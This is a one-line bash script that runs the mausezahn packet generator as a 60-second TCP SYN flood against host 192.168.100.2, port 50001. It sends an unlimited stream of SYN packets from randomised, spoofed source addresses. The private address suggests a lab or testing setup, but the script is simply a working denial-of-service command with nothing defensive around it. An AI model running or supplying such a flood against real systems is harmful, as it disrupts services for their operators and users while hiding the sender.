#!/bin/bash

# Mausezahn TCP SYN Flood (60 seconds)
sudo timeout -s INT 60 mausezahn enp0s3 -A rand -B 192.168.100.2 -t tcp "dp=50001, flags=syn, win=8192" -c 0